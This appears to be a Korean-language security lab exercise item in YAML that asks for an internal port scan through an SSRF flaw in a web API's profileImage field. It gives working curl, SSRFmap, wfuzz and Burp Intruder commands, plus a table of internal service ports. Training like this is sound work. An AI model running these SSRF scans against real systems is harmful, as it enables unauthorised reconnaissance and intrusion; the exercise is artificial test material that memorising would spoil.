- order: 2
  instruction: |-
    {{WEB_IP}} 대상으로 내부 네트워크 포트 스캔을 수행하시오.

    ■ 실습 방법

    ▶ 1단계: 도구 A — curl 으로 SSRF 포트 스캔
    ```bash
    # 응답 시간 / 코드 / 본문 차이로 포트 상태 판별
    for port in 22 80 443 3306 5432 6379 8080 9200 27017; do
      RESP=$(curl -s -X PUT "http://10.20.30.80/api/Users/1" \
        -H "Authorization: Bearer $JWT" \
        -d "{\"profileImage\":\"http://127.0.0.1:$port\"}" \
        -w 'time:%{time_total} code:%{http_code}' -o /dev/null)
      echo "127.0.0.1:$port → $RESP"
    done
    echo "내부 네트워크 포트 스캔 완료"
    ```
    응답 시간 차이:
    - 빠른 응답 (<0.1s) + 200/302 = 포트 OPEN
    - 빠른 응답 + 500 (connection refused) = 포트 CLOSED
    - 느림 (>5s, timeout) = 필터링 또는 타 호스트

    ▶ 2단계: 도구 B — SSRFmap port scan 모듈
    ```bash
    cd ~/SSRFmap
    python3 ssrfmap.py -r request.txt -p url -m portscan
    # 자동으로 1-65535 포트 스캔 (응답 시간 기반)
    ```

    ▶ 3단계: 도구 C — wfuzz 으로 다중 포트 자동
    ```bash
    wfuzz -c -X PUT \
          -u "http://10.20.30.80/api/Users/1" \
          -d '{"profileImage":"http://127.0.0.1:FUZZ"}' \
          -H "Authorization: Bearer $JWT" \
          -z range,1-65535 \
          --hl 50  # 응답 길이 50 hide (closed)
    ```

    ▶ 4단계: 도구 D — Burp Intruder (GUI 시각화)
    1. SSRF endpoint 캡처 → Intruder
    2. URL 의 port 부분 §...§
    3. Payloads: 1~65535 numbers
    4. Start Attack → Status / Length / Response Time 비교 표

    ▶ 5단계: 일반 내부 서비스 포트 표
    | port | 서비스 |
    |---|---|
    | 22 | SSH |
    | 80/443/8080/8443 | HTTP/HTTPS |
    | 3000/4000/5000/8000 | 개발 서버 |
    | 3306 | MySQL |
    | 5432 | PostgreSQL |
    | 6379 | Redis |
    | 9200/9300 | Elasticsearch |
    | 27017 | MongoDB |
    | 11211 | Memcached |
    | 9092 | Kafka |
    | 5672/15672 | RabbitMQ |

    ▶ 6단계: 답변
    응답 시간/코드 표 quote + 발견된 OPEN 포트 + 후속 익스플로잇 가능성.
